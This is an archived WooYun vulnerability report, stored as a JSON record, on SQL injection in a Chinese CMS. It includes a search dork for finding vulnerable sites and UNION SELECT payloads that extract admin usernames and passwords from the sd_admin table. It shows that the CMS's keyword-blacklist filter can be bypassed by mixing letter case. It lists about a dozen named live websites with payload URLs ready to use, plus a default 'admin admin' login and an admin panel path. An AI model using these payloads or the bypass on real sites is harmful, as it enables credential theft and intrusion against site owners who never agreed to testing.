{"id": 43222, "wybug_id": "wooyun-2014-083409", "wybug_title": "某通用CMS存在sql注射（轻松绕过防注入+官网复现）", "wybug_corp": "乐艺科技", "wybug_author": "郭斯特", "wybug_date": "2014-11-18 10:57", "wybug_open_date": "2015-02-16 10:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-18：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-16：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT~可union~ 详细说明：  技术支持:乐艺科技inurl:about.asp?ncid=   漏洞参数：ncid=about.asp?ncid=   case_show.asp?ncid=exp1：union sElect 1,title,3,pass,5,6,7,8,9,10,11,12,13 from sd_adminexp2：case_show.asp?ncid=56 union sElect 1,title,3,pass,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 from sd_admin系统自带防御脚本conn.asp<!--#include file=\"lesiure/check.asp\"--><%dim sql_injdata,SQL_inj,SQL_Get,SQL_Data,Sql_Post SQL_injdata = \"'|and|exec|insert|select|delete|update|count|*|chr|mid|master|truncate|char|declare|-1\"SQL_inj = split(SQL_Injdata,\"|\")If Request.QueryString<>\"\" ThenFor Each SQL_Get In Request.QueryStringFor SQL_Data=0 To Ubound(SQL_inj)if instr(Request.QueryString(SQL_Get),Sql_Inj(Sql_DATA))>0 ThenResponse.Write \"<Script Language=javascript>alert('注意：请不要提交非法请求！');history.back(-1)</Script>\"Response.endend ifnextNextEnd IfIf Request.Form<>\"\" ThenFor Each Sql_Post In Request.FormFor SQL_Data=0 To Ubound(SQL_inj)if instr(Request.Form(Sql_Post),Sql_Inj(Sql_DATA))>0 ThenResponse.Write \"<Script Language=javascript>alert('注意：请不要提交非法请求！');history.back(-1)</Script>\"Response.endend ifnextnextend if %><%set conn=Server.CreateObject(\"Adodb.Connection\")set rs=Server.CreateObject(\"Adodb.RecordSet\")dim dbpath  'the database pathdbpath=server.mappath(\"data/web.mdb\")connstr=\"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\"&dbpathconn.Open connstr%><%dim company_keyword,company_content,company_name,company_Boss,company_telephone,company_tell,company_fax,company_Email,company_http,company_qq,company_address,company_icpset rs=conn.execute(\"select * from sd_company_info\")\t\t\tif not rs.eof thencompany_content=rs(\"content\")company_keyword=rs(\"keyword\")company_name=rs(\"company\")company_Boss=rs(\"Boss\")company_telephone=rs(\"telephone\")company_tell=rs(\"tell\")company_fax=rs(\"fax\")company_Email=rs(\"Email\")company_http=rs(\"http\")company_qq=rs(\"qq\")company_address=rs(\"address\")company_icp=rs(\"icp\")end ifrs.closeset rs=nothing%>官网http://www.lerye.cn/case_show.asp?ncid=56防注入此时我们将敏感语句换成大写就可以轻松绕过。这种情况在我测试很多cms都存在。这种防注入脚本基本没用啊...\n\nhttp://www.lerye.cn/case_show.asp?ncid=56 union sElect 1,title,3,pass,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 from sd_admin\n\nadmin adminhttp://www.lerye.cn/lesiure/admin_index.asp\n\nhttp://wst090.com/case_show.asp?ncid=30%20union%20sElect%201,title,3,pass,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%20from%20sd_admin\n\n   漏洞证明：  http://www.jsyl155.com/about.asp?ncid=1%20union%20sElect%201,title,3,pass,5,6,7,8,9,10,11,12,13%20from%20sd_admin\n\nhttp://www.cipon.net/about.asp?ncid=2 union sElect 1,title,3,pass,5,6,7,8,9,10,11,12,13 from sd_admin\n\nhttp://www.mogold.com.cn/about.asp?ncid=2 union sElect 1,title,3,pass,5,6,7,8,9,10,11,12 from sd_admin\n\nhttp://www.jsyl155.com/about.asp?ncid=4 union sElect 1,title,3,pass,5,6,7,8,9,10,11,12,13 from sd_admin\n\nhttp://www.sdyt531.com/about.asp?ncid=3 union sElect 1,title,3,pass,5,6,7,8,9,10,11,12,13 from sd_admin\n\nhttp://gssscale.w137.mc-test.com/about.asp?ncid=7 union sElect 1,title,3,pass,5,6,7,8,9,10,11,12 from sd_admin\n\nhttp://www.bsjsjtx.com/about.asp?ncid=2 union sElect 1,title,3,pass,5,6,7,8,9,10,11,12,13 from sd_admin\n\nhttp://www.txsbsjsj.com/about.asp?ncid=2 union sElect 1,title,3,pass,5,6,7,8,9,10,11,12,13 from sd_admin\n\nhttp://www.asieris.cn/about.asp?ncid=2 union sElect 1,title,3,pass,5,6,7,8,9,10,11,12,13 from sd_admin\n\nhttp://euweili.w28.mc-test.com//about.asp?ncid=2 union sElect 1,title,3,pass,5,6,7,8,9,10,11,12 from sd_admin\n\nand so on   修复方案：  过滤吧   版权声明：转载请注明来源 郭斯特@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}